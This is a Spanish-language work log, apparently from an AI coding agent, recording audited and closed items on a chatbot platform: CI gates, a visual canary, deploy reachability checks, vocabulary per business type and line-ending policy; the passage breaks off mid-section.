- [x] **El gate que impide que un icono vuelva a salir como palabra en el menú EXISTÍA y no lo
      corría nadie.** Cerrado el 2026-09-02 (commit `d62beeb` de `onia-platform`, rama
      `claude/chatbots-platform-review-0d1d09`). Archivos:
      `__tests__/gate-iconos-esta-cableado.test.ts` (nuevo) y `package.json`.
      Salió de auditar los `[x]`, que es lo que manda el loop cuando "Ahora" queda sin ítems
      desbloqueados — los tres de "Después" siguen frenados por algo que no es código.
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy en vivo |
      |---|---|
      | los 7 loops `VPS` de `loops.md` están en `crontab -l` | los 7, con su expresión exacta. Nada que rearmar |
      | `S16` sigue vivo | `npm run deploy:alcanzable` → exit **1**, `22fd088` y `675541b` `no-llega`; `e644c85` sigue saliendo `ok` |
      | `npm run gate:iconos` da verde | exit **0**, `35 iconos del menu, los 35 dibujan glifo` |
      | suite del bot verde | `npm run test:bot` → **697 pass, 0 fail** |
      | `npm run campanas:vivas` sale 0 | exit **0**, `5 frases vivas, 5 con campaña` |
      | los npm scripts que la cola nombra existen | 6 de 6 en su repo (`gate:iconos` es de `onia-platform`, no de acá) |
      | las 22 rutas de `onia-platform` que la cola declara existen | 22 de 22 — incluido que `scripts/iconos-en-la-fuente.test.ts` **siga sin existir**, que es lo que la cola dice |
      🔴 **Lo que salió FALSO, y es de la clase cara: literalmente cierto, funcionalmente falso.**
      El ítem de acá abajo dice *"el gate que S11 daba por hecho ahora existe de verdad"*. Existe.
      **Y no lo invocaba nadie.** Medido, no supuesto: `gate:iconos` no estaba en `npm test`
      (es un `.mjs`, vitest no lo ve), ni en la cadena `npm run ci`, ni en
      `.github/workflows/ci.yml`, ni en `build`. Su única mención en todo el repo fuera del
      propio script era un comentario en `components/layout/navigation.ts:47`.
      **La consecuencia:** el agujero que ese ítem declaraba tapado seguía abierto entero. Se
      agrega un icono al menú → `scripts/subset-iconos.mjs` se rinde en silencio y sale 0 si
      falta `pyftsubset` → la fuente publicada no trae el glifo → el nombre crudo vuelve al
      sidebar de **toda** pantalla del dashboard, `/inbox` incluida, y nada se pone rojo. Es
      exactamente el camino por el que se coló `ASSIGNMENT_TURNED_IN` la primera vez.
      El vecino `__tests__/eslint-no-lintea-worktrees.test.ts` ya lo tenía escrito en una línea:
      *"Un gate que nadie corre no existe"*. Estaba en el repo y no se aplicó al gate siguiente.
      **Lo que se hizo:** `gate:iconos` entra a la cadena `ci`, **antes del `build`**. Antes y no
      después porque el gate mide la fuente **commiteada** —la que se publica cuando el subset
      falla mudo—; medirla después sería medir la regenerada, justo la que el entorno roto no
      produce. Y falla en 2 s en vez de después de un `next build` entero.
      **Y su guardia, que es el punto:** el test nuevo vigila el **cableado**, no los iconos, y
      por eso no necesita navegador — vive en `npm test`, que **sí** corre GitHub Actions, así
      que sacar el gate de la cadena pone el CI en rojo.
      ⚠️ **Lo que este ítem NO logra, dicho antes de que alguien lo asuma:** GitHub Actions
      **no** renderiza los 35 iconos. `ci.yml` no instala navegadores (no tiene
      `playwright install`), así que el renderizado real sigue ocurriendo sólo donde hay
      Chromium: `npm run ci` en local y en el VPS. Cablearlo en Actions es agregar un paso de
      instalación de navegador que desde este loop **no se puede verificar corriendo**, y un
      paso de CI que rompe para todos es peor que el hueco que tapa. Anotado, no hecho.
      **Probado que muerde, no sólo que pasa:** **2 rojos** antes por el motivo correcto. El
      segundo caso hizo falta corregirlo: pasaba en **verde** con el gate AUSENTE, porque
      `indexOf` de un string que no está da `-1` y `-1` es menor que cualquier índice — o sea
      que el caso "corre antes del build" daba verde justo cuando fallaba lo que mide. Los dos
      `toBeGreaterThan(-1)` no son adorno.
      **Gates:** `tsc --noEmit` limpio · **2444** tests verdes (198 archivos, +3 nuevos sobre
      los 2441 anotados) · `eslint` 0 en el archivo tocado.
      ⚠️ **Commiteado, NO mergeado.** `d62beeb` es el **tercer** commit de este carril que no
      llega a `origin/master` — se suma a **S16**, no a S11: no necesita un deploy al VPS (es un
      `package.json` y un test), necesita estar en `master` para que el CI de `master` lo corra.

- [x] **Los dos arreglos de este carril al producto estaban pusheados y a nadie le llegaban: el
      deploy buildea `master` y no están en `master`.** Cerrado el 2026-09-02. Archivos:
      `scripts/deploy_alcanzable.mjs` (nuevo) y `package.json`. Salió de auditar los `[x]`, que
      es lo que manda el loop cuando "Ahora" queda sin ítems desbloqueados.
      🔴 **Gate 1 primero, y acá salvó la vuelta dos veces.** (1) El primer hallazgo aparente fue
      que 5 de las 10 pantallas del canario no tenían baseline. **Falso:** existen en `main` — era
      **esta rama la que estaba 14 commits atrás**. Se hizo `merge --ff-only origin/main` antes de
      seguir, porque además `scripts/verificar_cola.js` había cambiado en `main` (`dc8baa8b`) y el
      gate se estaba corriendo con una versión vieja. (2) Con el árbol al día, el gate de la cola
      sigue diciendo `cola-vacia` **exit 1**, que es la verdad: "Ahora" está vacío.
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy en vivo |
      |---|---|
      | el canario reporta `panel-chatbot` como `NO MEDIDA` nombrando las dos variables | corrido en vivo: `NO MEDIDA :: faltan ONIA_CANARIO_USER / ONIA_CANARIO_PASS`. Y su baseline sigue en `bytes: 0` |
      | `--self-check` cuenta 65 casos sobre 10 pantallas | `self-check: ok — 65 casos sobre 10 pantallas`, exit 0 |
      | el login del chat pesa 3,58 MB y su baseline dejó de estar anclada en 12,9 MB | corrido en vivo: **3499 KB / 868 ms**, contra una baseline de 3.583.426 B. Coinciden: la baseline es honesta |
      | la evidencia del ítem existe | `hermes-content/docs/historial/canario-visual/2026-09-01-login-chat.png`, 22.552 B |
      | los commits `22fd088` y `675541b` existen y están pusheados | sí, los dos en `origin/claude/chatbots-platform-review-0d1d09` de `onia-platform` |
      🔴 **Lo que salió FALSO, y es lo que esta vuelta arregla.** "Pusheado" no es "alcanzable".
      `onia-platform` se despliega buildeando `origin/master` (§20 del radar lo midió:
      producción corre `8a3b5a6`), y los dos commits **no están en `master`** — viven en la rama
      del carril, 2 adelante y 17 atrás, que nadie mergea. Con el OK de Sergio dado, el swap
      buildea `master`, el icono sigue roto y **S11** se cierra en falso. **Es la tercera vez que
      esa misma fila se queda corta**: primero el commit no existía, después existía sin estar
      mergeado, ahora no llega. Las tres veces la lista la mantenía un párrafo a mano.
      **Causa, medida y no supuesta:** el integrador tiene el merge a `master` pre-autorizado,
      pero su Paso 1 hace `cd /root/loops/onia-hermes` y cuenta la rama contra el `main` de **ese**
      repo, donde da 0. El mismo nombre de rama existe en los dos repos y el que tiene trabajo sin
      mergear es el que nadie enumera. Es procedimiento del carril de integración ⇒ **S16** + radar
      §23, con las tres opciones cotizadas.
      **Lo que se hizo, para que no lo mantenga un párrafo:** `npm run deploy:alcanzable` saca los
      commits de `onia-platform` que la cola declara —exigiendo el `de \`onia-platform\``, porque
      la cola nombra también commits del bot y de `onia-hermes`— y le pregunta a git si
      `origin/master` los alcanza. Distingue los **dos** modos de falla ya pagados: `no-existe` y
      `no-llega`. Corrido: **exit 1** nombrando `22fd088` y `675541b`, y `e644c85` (de un ítem
      viejo) sale **OK** — ésa es la prueba de que discrimina en vez de gritar a todo.
      **Probado que los tests MUERDEN, no sólo que pasan:** aflojando el discriminador de repo →
      **2 rojos**; apagando `juzgar()` → **2 rojos** más el que exige que el motivo diga en qué
      línea corregir; apagando la deduplicación por sha → **1 rojo**. `--self-check` cuenta sus
      casos en vez de hardcodearlos (13), por la misma razón que el canario: un conteo que miente
      es la primera grieta de un gate.
      **Cableado como el resto del repo:** la medición en vivo es su propio script
      (`deploy:alcanzable`) y **no** entra a `npm test` —igual que `marca:chatwoot` y
      `campanas:vivas`, que también están rojos esperando un `scp`—; lo que entra a `npm test` es
      el `--self-check` (`test:deploy-alcanzable`). Un gate que siempre truena lo apaga alguien.
      ⚠️ **No mergea ni despliega nada.** `master` es rama protegida de este loop y hay un hook
      `pre-push` que lo bloquea.

- [x] **El menú del producto mostraba `ASSIGNMENT_TURNED_IN` en letras gigantes, y el bloqueo
      que decía tenerlo arreglado apuntaba a un commit inexistente.** Cerrado el 2026-09-02
      (commit `22fd088` de `onia-platform`, rama `claude/chatbots-platform-review-0d1d09`).
      **Commiteado, NO desplegado** — el deploy es de Sergio y sigue como **S11**.
      Salió de la auditoría de los `[x]`, que es lo que manda el loop cuando "Ahora" queda sin
      ítems desbloqueados (los tres de "Después" están frenados por algo que no es código).
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy |
      |---|---|
      | suite del bot verde | `npm run test:bot` → **697 pass, 0 fail** (creció desde los 684 anotados; ninguno rojo) |
      | `npm run campanas:vivas` sale 0, 5 de 5 cubiertas | exit **0**, `5 frases vivas, 5 con campaña` |
      | S10 sigue vivo: `REVERTIDAS 3/9` | `npm run marca:chatwoot` → exit **1**, las mismas tres (`BRAND_URL`, `TERMS_URL`, `PRIVACY_URL`) |
      | S9 sigue vivo y el gate nombra los acoples | `espejo-check.mjs` → exit **1**, y `VIAJAN JUNTOS` imprime `recepcionista.mjs` → `config.mjs` + `intents.mjs` |
      | los 15 archivos que la cola declara del producto existen | **14 de 15** existen; el que falta es el que destapó todo |
      **El que falló: `scripts/iconos-en-la-fuente.test.ts`**, que **S11** daba por escrito. No
      existe — y tirando del hilo, tampoco existe el commit `4f86381` ni la rama
      `carril/chatbot-v68-friccion` que S11 mandaba desplegar: `git fetch --all --prune` contra
      GitHub y ninguna de las 39 ramas remotas matchea. Ese trabajo se hizo en Windows y nunca
      se pusheó. **La fila S11 le pedía a Sergio desplegar la nada**, y por eso no se destrababa.
      **El defecto seguía vivo, y se comprobó MIRANDO, no con grep:** renderizado el `.woff2` que
      se publica, `assignment_turned_in` mide **20em** (el texto crudo) contra **1em** de los
      otros 34 iconos del menú. Los 35 se midieron: es el **único** roto.
      **Por qué se coló, que es el hallazgo que sobrevive al ítem.** Dos guardas que parecían
      cubrirlo y no lo cubrían: el icono entró el 30-ago (`ab9e0de`) y la fuente subseteada es
      del 29-ago (`917adca`), pero `scripts/subset-iconos.mjs` —que corre **dentro del `build`**—
      **se rinde en silencio y sale 0** cuando falta `pyftsubset` (reproducido en este VPS), así
      que el build publica la fuente vieja sin decir una palabra; y `e2e/iconos.spec.ts` sólo
      mira `/`, `/login` y `/register`, y el sidebar exige sesión.
      **Lo que se hizo.** El ítem usa `task_alt`, que ya está en el subset y significa lo mismo:
      así el arreglo **no depende de que exista Python en el entorno de build**, que es justo lo
      que falló. Regenerar la fuente habría necesitado `pyftsubset`, que no está en el VPS y no
      se instaló a propósito. Y el gate que S11 daba por hecho ahora existe de verdad:
      `npm run gate:iconos` (`scripts/iconos-en-la-fuente.mjs`) renderiza los 35 iconos que el
      menú declara contra la fuente publicada, **sin sesión ni app levantada** — por eso es
      corrible desde este loop, y por eso cubre el hueco que S15 (la credencial del canario)
      deja abierto. **Probado que muerde:** rojo antes por el motivo correcto
      (`assignment_turned_in — 20em`), verde después (`35 iconos, los 35 dibujan glifo`).
      Los **5 snapshots** del pack por rubro se movieron solos con el icono; revisado que la
      única diferencia del diff fuera `icon` antes de actualizarlos.
      **Gates:** `tsc --noEmit` limpio · **2441** tests verdes (197 archivos) · `eslint` 0
      errores y 0 warnings en los archivos tocados.
      🔴 **Corregido el 2026-09-02 (vuelta siguiente, auditando este mismo `[x]`): la frase
      "el gate que S11 daba por hecho ahora existe de verdad" era cierta y no alcanzaba.**
      El gate existía y **no lo corría nadie** — ni `npm test`, ni `npm run ci`, ni `ci.yml`, ni
      `build` — así que el agujero que este ítem declara tapado siguió abierto hasta que se
      cableó. El ítem NO se desmarca porque el trabajo se hizo y el icono está arreglado; lo
      que estaba mal era la conclusión. **Construir un gate y cablearlo son dos cosas**, y esta
      cola ya paga esa distinción en otra parte (S9: "commitear una mejora no la enciende").
      Cerrado arriba, en el primer ítem de esta sección.

- [x] **Saber QUÉ archivos difieren no alcanzaba para desplegar bien: el gate ahora dice cuáles
      VIAJAN JUNTOS.** Cerrado el 2026-09-02. Archivos: `hermes-content/deploy/vps-ops/bot/espejo-check.mjs`
      y su `.test.mjs`. Salió de auditar los `[x]` — "Ahora" estaba vacío y los tres de "Después"
      siguen frenados por algo que no es código (el disco es de la máquina Windows de Sergio y el
      ítem dice que no lo arregla este carril; la data QA es "no borrar todavía"; el QR espera el
      banco, **S2**).
      **Lo que se auditó y salió CIERTO** — se escribe porque una auditoría que sólo reporta lo
      que falla no prueba que haya mirado:
      | afirmación de la cola | medido hoy en vivo |
      |---|---|
      | `Onia (interna)` → inbox 5 (el comando que el ítem del 01-sep dejó escrito) | la base de producción da **5**. `ZZ QA Clinica Chatbot` → 7, las otras dos en NULL. El revert silencioso **no** volvió |
      | inbox 4 = 6 desconocidos, dos del 01-sep | **exactamente esos seis** (34, 36, 38, 40, 45, 46). Ninguno nuevo desde el 01-sep; la conv 10 es "Visitante Prueba Web" con 0 mensajes |
      | S10 sigue vivo, no vencido | `npm run marca:chatwoot` → exit **1**, `REVERTIDAS 3/9` (`BRAND_URL`, `TERMS_URL`, `PRIVACY_URL`). Sin cambio |
      | `campanas:vivas` en 0 | exit **0**, 5 frases vivas / 5 con campaña |
      | suite del bot verde | **690/690** antes de tocar nada (la cola decía 684: creció, no se rompió) |
      | commit `675541b` de `onia-platform` existe con lo que dice | sí: 6 archivos, `vocabulario.ts` + `ChatbotClient.tsx` + los dos tests. Sigue **commiteado, NO desplegado** |
      🔴 **Lo que salió FALSO, y es lo que esta vuelta arregla: S9 estaba corto otra vez.** El
      detalle y la lista corregida están en su fila; el resumen es que el espejo sumó la feature
      del link de agenda en **cinco** archivos y S9 nombraba dos, con un acople duro
      (`intents.wantsToBook` y `R_AGENDA` no existen en el VPS). **Es la tercera vez que la misma
      instrucción se queda corta** — antes fue el dato sin el código que lo lee, después el
      esquema que rechazaba la clave nueva. Las tres veces la lista la mantenía un párrafo a mano.
      **Por eso el arreglo no es corregir el párrafo otra vez, sino que lo diga el gate:**
      `espejo-check.mjs` calcula los acoples en vivo (`simbolosUsados`, `simbolosDefinidos`,
      `acoplesDeCopia`) y ahora imprime `VIAJAN JUNTOS (copiar uno solo deja el motor llamando a
      lo que no existe): recepcionista.mjs NO viaja solo: necesita config.mjs (config.R_AGENDA),
      intents.mjs (intents.wantsToBook)`. Es análisis estático a propósito: importar los módulos
      del VPS ejecutaría su motor dentro de un gate de sólo lectura.
      **Trampas que costaron una corrección cada una, y quedan con su caso:** (1) sin exigir el
      paréntesis, `"./intents.mjs"` del import colaba un símbolo fantasma; (2) `recepcionista.mjs`
      **no importa `say`**, lo recibe inyectado desde `bot-engine`
      (`const { finalize, handoffResult, say } = motor;`) — buscar sólo el import daba un falso
      **negativo**, que en un gate es peor que el falso positivo porque calla justo donde hay que
      avisar; (3) el propio `espejo-check.mjs` y los `.test.mjs` se auto-denunciaban por citar
      `R_AGENDA` y `wantsToBook` en comentarios y fixtures: quedan afuera del análisis por ser
      herramienta y no motor.
      **Probado que los tests MUERDEN:** aflojando el paréntesis del regex → **3 rojos**, uno de
      ellos el guardia de que el espejo real es coherente consigo mismo (si ese fallara, el roto
      sería el espejo). Suite del bot **697/697** verde (690 antes). El gate sigue en exit 1 y
      ahora nombra **una** línea de acople, la real.
      ⚠️ **No despliega nada.** El `scp` sigue siendo de Sergio y sigue siendo **S9**; lo que
      cambió es que la lista de qué copiar ya no la mantiene un párrafo que envejece.

- [x] **El canario daba por buena la pantalla del panel del chatbot sin haberla visto nunca:
      medía el LOGIN y lo reportaba como "sin disparo mecánico".** Cerrado el 2026-09-02.
      Archivos: `scripts/canario_visual.mjs` y
      `hermes-content/references/canario-visual/panel-chatbot/baseline.json`.
      🔴 **Gate 1 corrigió el ítem, y hacia peor.** El ítem afirmaba *"el canario la reporta
      **no medida** — nunca OK"*. **Falso, y medido, no leído:** corrido en vivo antes de tocar
      nada, imprimía `panel-chatbot status=200 702 KB 148 ms sin disparo mecanico
      (comparada)`. La palabra `comparada` es literal — comparó contra una baseline. El
      `NOTA: NO MEDIDA` que el ítem citaba como salvaguarda era **una cadena de texto en el
      JSON que el script nunca lee**: un comentario para un humano que ningún humano abre.
      O sea que la pantalla no salía "no medida": salía **verde**.
      **Y la baseline estaba envenenada, que es la mitad que nadie había visto.** Guardaba
      `bytes: 773831` y `msMirable: 973` — los del **login**— bajo el nombre del panel. Efecto
      doble: hoy el login se compara contra sí mismo y da verde eterno; y el día que la sesión
      funcione, el panel real dispara un **fantasma de peso** contra números de otra pantalla.
      Es el mismo defecto que se cerró ayer en `login-chat` (baseline anclada 3,6× arriba de la
      realidad): **verde con cara de éxito, dentro del vigilante mismo**, por segundo día
      seguido.
      **Lo que se hizo:** `llegoALaPantalla(urlPedida, urlFinal)` compara host + camino
      (el query string y la barra final no son desvíos) y `medir()` marca `medida: false`
      cuando la página que quedó abierta no es la que se pidió. `juzgar()` corta ahí y
      devuelve un **tercer veredicto**, `NO MEDIDA`, que no es ítem ni "sin disparo":
      no es ítem **a propósito** —gritaría en cada vuelta hasta que alguien apague el canario,
      que es la trampa que el propio script documenta en `espejo-check`— y sobre todo **no
      compara contra la baseline**, que es lo que mataba el fantasma de peso.
      La línea impresa ahora dice `NO MEDIDA :: <motivo> — la captura es de OTRA pantalla, no
      la mires como si fuera esta`.
      **Circuito de sesión hasta el borde (regla 2 del carril):** `requiereSesion: true` es un
      campo de la lista, y `iniciarSesion()` entra por el formulario real de `/login`. Con
      `ONIA_CANARIO_USER` / `ONIA_CANARIO_PASS` puestos, el canario entra y mide el panel de
      verdad; sin ellos degrada a `NO MEDIDA` nombrando **exactamente** las dos variables que
      faltan. **Enchufarlas es un `env`, no un cambio de código** — es todo lo que queda, y es
      **S15**.
      **Trampa que casi introduzco y quedó cubierta con su caso:** el primer corte era
      `medida = !fallo && llegoALaPantalla(...)`, que degradaba a `NO MEDIDA` una pantalla
      **caída** — o sea que una caída real de producción salía como veredicto tibio en vez de
      ítem. Ahora `medida` es `null` cuando hay `fallo`, y hay un caso que lo fija.
      **Probado que los tests MUERDEN:** apagando el corte de `juzgar()` → **3 casos rojos**;
      apagando la detección de desvío (`return true`) → **3 casos rojos**; restaurado, verde.
      El `--self-check` pasó de 13 casos escritos a mano a **65 contados por el propio
      script** (un conteo hardcodeado ya había dejado de coincidir con la realidad).
      **Verificado en vivo, no en frío**, y con dos pantallas sanas al lado para medir el radio:
      ```
      home              200  2859 KB  216 ms  sin disparo mecanico (comparada)
      login-plataforma  200   699 KB  123 ms  sin disparo mecanico (comparada)
      panel-chatbot     200   702 KB  133 ms  NO MEDIDA :: faltan ONIA_CANARIO_USER / ...
      ```
      Las otras **nueve** pantallas no se movieron: comprobado antes de tocar nada que
      `panel-chatbot` es la **única** cuya baseline tiene `urlFinal ≠ url`.
      **MIRADA la captura** (`/tmp/canario-post/panel-chatbot.png`): es el login de
      `app.onia.com.bo` — logo, los dos campos, "Iniciar sesión" — con los cuatro iconos
      (`bolt`, `credit_card_off`, `smart_toy`, `person_add`) dibujados como glifos y **no**
      como palabras. La baseline se reemplazó por un registro con los números en **0**, para
      que ni leída por accidente pueda producir una comparación falsa.

- [x] **El login del chat NO pesa 12,9 MB: pesa 3,58 MB, y los 12,9 eran el mismo contenido
      SIN COMPRIMIR.** Cerrado el 2026-09-02. Lo que cambió en el repo:
      `hermes-content/references/canario-visual/login-chat/baseline.json`.
      **Gate 1 primero, y acá salvó la vuelta:** el ítem pedía "ver qué assets entran antes de
      decidir si se puede partir o si es el precio de Chatwoot", así que lo primero fue medir de
      nuevo en vez de heredar el número. Da **3.583.426 bytes** y 808-913 ms — no 12.953.799 ni
      2.437 ms. Corrido **tres veces seguidas con el propio canario**: 3499 KB clavado las tres.
      **De dónde salían los 12,9 MB, medido y no supuesto:** se bajó cada asset del login con
      `Accept-Encoding: identity` y se sumaron uno por uno → **12.973.552 bytes**, que está a
      **0,15 %** del número viejo. O sea que los 12,9 MB son los bytes *decodificados* de estos
      mismos assets, no assets de más. Por el cable viajan 3,58 MB gzip. La conclusión del ítem
      —"es el bundle de Chatwoot servido entero en la ruta de login"— era **correcta**; el que
      estaba mal era el tamaño, por un factor de 3,6.
      **La respuesta a la pregunta que el ítem hacía: es el precio de Chatwoot, y se paga una
      sola vez.** El **92 %** del peso comprimido es UN chunk, `vite/assets/DashboardIcon-*.js`
      (11,25 MB crudo / 3,14 MB gzip), que se construye dentro del contenedor de Chatwoot —
      partirlo es modificar el motor. Pero se sirve con `max-age=31556952` y nombre hasheado:
      medida la segunda visita del mismo navegador, baja **10 KB en 237 ms — el 0,2 % de la
      primera**. Y no la ve ningún cliente: `grep` de `chat.onia.com.bo` en todo `web-factory/`
      no devuelve **nada**, es el login del MOTOR, que por regla dura "está hecho para no verse".
      No hay nada que arreglar en la pantalla, y se MIRÓ renderizada para decirlo: logo Onia,
      los dos campos y el botón, sin nombres de iconos crudos.
      🔴 **Lo que SÍ estaba roto era el gate, y es el hallazgo que sobrevive al ítem.** La
      baseline se había guardado con los 12.953.799 bytes de aquella lectura. Con
      `derivaPeso: 1.4`, la alarma de peso de esta pantalla sólo saltaba **arriba de 18,1 MB**:
      un gate que no podía dispararse nunca, anclado 3,6× por encima de la realidad — "verde con
      cara de éxito", exactamente lo que este carril existe para cazar, esta vez en el vigilante
      mismo. Reemplazada por la medición real, así el techo absoluto de 4 MB vuelve a ser el que
      manda. La baseline lleva escrito que si una vuelta futura vuelve a leer ~12,9 MB **no es la
      pantalla engordando: es que los assets llegaron sin comprimir**, y eso sí es un ítem.
      **Evidencia:** `hermes-content/docs/historial/canario-visual/2026-09-01-login-chat.png`
      y el script que la saca, `scripts/canario_visual.mjs`.

- [x] **"La cita" ya no le habla de consultorio a una ferretería: cada rubro lee su propia
      palabra.** Cerrado el 2026-09-02 (commit `675541b` de `onia-platform`, rama
      `claude/chatbots-platform-review-0d1d09`). **Commiteado, NO desplegado — y medido el mismo
      día: tampoco llega a `origin/master`, que es de donde se buildea. Ver S16.**
      **Gate 1 primero, en vivo:** el ítem era REAL —`ChatbotClient.tsx` líneas 90, 505, 510 y
      520 seguían con los literales— y no estaba cerrado más abajo.
      🔴 **Pero su diagnóstico estaba incompleto, y el dato que faltaba lo hacía más barato, no
      más caro.** El ítem decía *"lo decide el carril de plataforma"* porque agregar un campo a
      `lib/onboarding/vocabulario.ts` sonaba a tocar un módulo que consumen muchas pantallas.
      Medido: `VOCABULARIOS` es un `Record<VerticalTrackId, …>` con los 7 rubros explícitos, así
      que un campo nuevo es **aditivo** — TypeScript obliga a llenar los 7 y ningún consumidor
      actual se entera (Sidebar y Header leen `busqueda`, el alta lee `ejemploNombre`). Y la
      pantalla rota es `/settings/chatbot`, que es de ESTE carril.
      **Lo que el ítem no vio, y es el corazón del arreglo:** el modelo de dominio ya sabía la
      verdad y la pantalla no la leía. `lib/chatbot/plantillas.ts:53-55` no le da `demo` ni a
      comercio ni a importadora, con su motivo escrito —*"sin cita definida el bot deriva en vez
      de agendar"*—, mientras el editor les pedía igual configurar una cita, en dental.
      **Lo que se hizo:** `cita` y `citaModalidad` en `VocabularioAlta`, los 7 rubros, coherentes
      con la `demo.modalidad` de `plantillas.ts` (clínica/estética/veterinaria "la cita"; estudio
      "la reunión"; comercio, importadora y estancia "la visita"). `ChatbotClient` los recibe por
      prop, y `etiquetaDeCampo` los usa **también en los mensajes de error**, que decían
      "Duración de la cita" para todos. El bloque ahora avisa que dejarlo vacío hace derivar en
      vez de agendar — la regla dura del motor, que ningún rubro leía en pantalla.
      **Por qué el trinquete no lo había atajado, que es el hallazgo que sobrevive al ítem:**
      `__tests__/lib/vocabulario-por-rubro.test.ts` buscaba `paciente|clínica` y **no
      `consultorio`** — igual de dental, sólo que nombra el LUGAR en vez de la persona. Por eso
      esta pantalla pasó por debajo. Agregada la palabra al regex; radio medido ANTES de
      ampliarlo: **un solo archivo** (el otro hit era un comentario, y `textoVisible` los
      strippea), o sea que el trinquete no arrastró deuda ajena.
      **Probado que los tests MUERDEN, no sólo que pasan:** revertidos a mano los dos literales,
      **5 tests se ponen rojos** (los 3 de rubro no-clínico + los 2 del trinquete) y vuelven a
      verde al restaurarlos. El nuevo `app/(dashboard)/settings/chatbot/bloque-cita.test.ts`
      **RENDERIZA el componente real** con `renderToStaticMarkup` y lee el HTML: un grep no
      distingue el literal viejo de una prop bien cableada. Va en `.ts` con `createElement` a
      propósito, para no tocar el `include` de `vitest.config.ts`, que comparten todos los
      carriles.
      **MIRADO renderizado en Chromium** (los tres rubros lado a lado): la ferretería lee
      **"La visita" / "en el local"**, la clínica conserva **"La cita" / "en el consultorio, o
      por videollamada"** —el arreglo no le quitó su palabra— y el estudio contable lee
      **"La reunión"**. ⚠️ **Con hoja de estilos sustituta, no la de producción:** este disco no
      tiene `.env` ni base sembrada, así que `/dev/demo` no levanta, y Tailwind v4 va por postcss
      (no hay binario para compilar los tokens sueltos). Lo verificado es el **texto y la
      estructura** del componente real; la piel de producción no se miró.
      **Gates:** `tsc --noEmit` limpio · **2441 tests** verdes (197 archivos) · `eslint` 0
      errores, y 0 warnings en los 5 archivos tocados.

- [x] **`espejo-check.mjs` quedó ciego el mismo día que el loop se mudó al VPS: intentaba
      SSH a sí mismo con una clave que no existe en el host.** Encontrado midiendo el ítem de
      "Ahora" (`npm run marca:chatwoot`, que SÍ funciona porque es un GET puro) y corriendo
      después el otro gate del carril por costumbre: `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs`
      tiraba `Permission denied (publickey)` contra `root@187.77.16.63` con la clave
      `~/.ssh/onia_hermes_vps_ed25519`, que no está en este disco — porque este disco YA es
      `187.77.16.63`, desde que `hermes-content/docs/cola/loops.md` movió el loop acá el
      2026-09-01. El gate no medía drift: **no corría nada**, y un gate que siempre truena se
      apaga o se ignora, que es el mismo fantasma que este script existe para matar.
      **Lo que se hizo:** `ladoVps({host, key, dir})` — si `dir` (`/opt/onia/bot`) existe en
      este mismo disco, lo lee directo con `md5Local`, sin SSH ni clave; si no, cae al SSH de
      siempre (loop corriendo fuera del VPS). `main()` usa `ladoVps` en vez de `md5Vps` a
      secas.
      **Probado que compara de verdad, no sólo que no truena:** corrido después del arreglo
      contra el `/opt/onia/bot` real del VPS, sale **`ESPEJO DESINCRONIZADO`** y nombra
      `knowledge.mjs` y `recepcionista.mjs` — exactamente los dos archivos que **S9** dice que
      faltan viajar — más el drift honesto de herramienta (`espejo-check.mjs` y su propio
      test, recién tocados) y `evals-contrato.test.mjs` (ya sabido, va en el `scp` de S9). El
      gate vuelve a decir la verdad sin tocar el VPS.
      **1 test nuevo** (`ladoVps` con un directorio temporal y un host/clave rotos a
      propósito: si intentara SSH, tiraría). Suite del bot **684/684** verde (683 antes).
      ⚠️ **No repara nada del VPS**, sólo el gate que lo mide. `chatwoot-marca-publica.mjs` y
      `campanas-vivas.mjs` no tenían este problema: son GET puro, sin SSH.

- [x] **El espejo del bot ya tiene política de fin de línea: un `git checkout` no vuelve a
      fabricar un deploy pendiente.** Cerrado el 2026-09-01 con las tres partes del "Hecho =".
      **1 · La política existe y es del alcance exacto:** `hermes-content/deploy/vps-ops/.gitattributes`
      suma `bot/*.mjs text eol=lf` al `*.sh text eol=lf` que ya tenía. El patrón lleva `bot/`
      a propósito — hay 40+ `.mjs` sueltos en `vps-ops/` que NO son el espejo, y `evals/` queda
      afuera igual que en el gate (`md5Local` no baja de `maxdepth 1`). Los `.sh` siguen forzados
      a LF por el motivo de siempre: ahí el `\r` no es cosmético, `#!/bin/bash` con CR no arranca.
      (Detalle encontrado de paso: ese `.gitattributes` estaba él mismo en CRLF.)
      **2 · Medido con un checkout real, no deducido:** `guardrails.mjs` borrado y restaurado con
      `git checkout --` sale ahora en **5506 bytes con 0 `\r`**; antes de la política el mismo
      checkout lo dejaba en **5636** (+130, una por línea), y ése era el rojo falso. Renormalizados
      además los **21 `.mjs` que estaban en CRLF en disco** con el blob en LF — o sea que
      coincidían con el VPS por casualidad. `git status` del espejo: limpio.
      **3 · El test que lo cuida:** `espejo-check.test.mjs` corre `git check-attr eol` sobre los
      `.mjs` sueltos del espejo y exige `lf` en todos. Lee la política **efectiva**, no el texto del
      archivo: es lo que git va a aplicar en el próximo checkout, que es justo lo que se cuida. Rojo
      por el motivo correcto antes del arreglo (los 60+ archivos listados uno por uno), verde después.
      Suite del bot **683/683** (los 671 de siempre + 12 evals, con éste adentro).
      ✅ **Y no agregó un solo rojo al gate**, que es lo único que probaba que el arreglo no
      desincronizaba nada: `espejo-check.mjs` sigue nombrando drift **honesto**, verificado abriendo
      los archivos contra el VPS en vez de creerle al hash — `recepcionista.mjs` (20 líneas) y
      `knowledge.mjs` (3) difieren por el opt-in `prefijo` del commit `ba970f4a`: contenido, no fin
      de línea. Por construcción no podía agregarlos, porque el gate hashea los `.mjs` sin `\r` de
      los dos lados desde la vuelta anterior. Los 8 rojos de hoy —`bot-engine.test.mjs`,
      `campanas-web.test.mjs`, `espejo-check.mjs`, `espejo-check.test.mjs`, `knowledge.mjs`,
      `recepcionista.mjs`, `recepcionista.test.mjs` y `evals-contrato.test.mjs` (falta en el VPS)—
      son el `scp` de **S9**, que escribe en el VPS y por eso es de Sergio.
      **Lo que la opción 1 traía y NO hizo falta:** el redeploy del directorio entero. La
      normalización quedó del lado del repo, y como el gate ya comparaba normalizado, el espejo pasa
      a ser un espejo de verdad **sin tocar producción**. Radar §12 cerrado.

      <details><summary>La historia de las nueve vueltas que costó (por qué la regla existe)</summary>

      **`git checkout` en este repo DESINCRONIZA el espejo del bot sin mostrar un solo cambio
